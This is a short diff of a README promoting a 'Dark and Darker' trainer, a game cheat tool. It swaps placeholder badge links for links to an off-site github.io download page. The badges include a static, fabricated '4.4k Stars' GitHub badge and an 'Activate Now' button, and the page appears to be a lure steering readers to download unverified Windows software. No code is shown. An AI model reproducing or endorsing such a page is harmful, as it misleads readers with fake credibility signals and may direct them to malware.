@@ -8,10 +8,10 @@ The brutal dungeons of *Dark and Darker* punish every mistake. The **Dark and Da
 
 Instead of relying on endless grind and risky dungeon farming, the trainer provides direct control over survival mechanics. Want to **test a class build without dying repeatedly**? Or perhaps **practice PvP duels** with no fear of gear loss? This trainer makes that possible while keeping gameplay fluid.
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.4k Stars](https://img.shields.io/badge/GitHub-⭐️%204.4k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://dark-and-darker-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://dark-and-darker-trainer.github.io/.github/)
+[![⭐️ 4.4k Stars](https://img.shields.io/badge/GitHub-⭐️%204.4k%20Stars-black?style=for-the-badge\&logo=github)](https://dark-and-darker-trainer.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://dark-and-darker-trainer.github.io/.github/)
 
 ---
 
